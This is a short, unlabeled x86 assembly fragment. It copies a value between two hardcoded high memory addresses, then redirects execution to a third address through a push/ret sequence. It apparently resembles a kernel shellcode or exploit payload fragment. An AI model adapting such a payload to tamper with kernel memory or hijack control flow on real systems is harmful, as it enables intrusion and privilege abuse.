movl $0x8013F160,%eax
movl $0x8013F158,%ebx
movl (%ebx),%ebx
movl %ebx,(%eax)
push $0x80139b69 
push $0x80139b69
ret
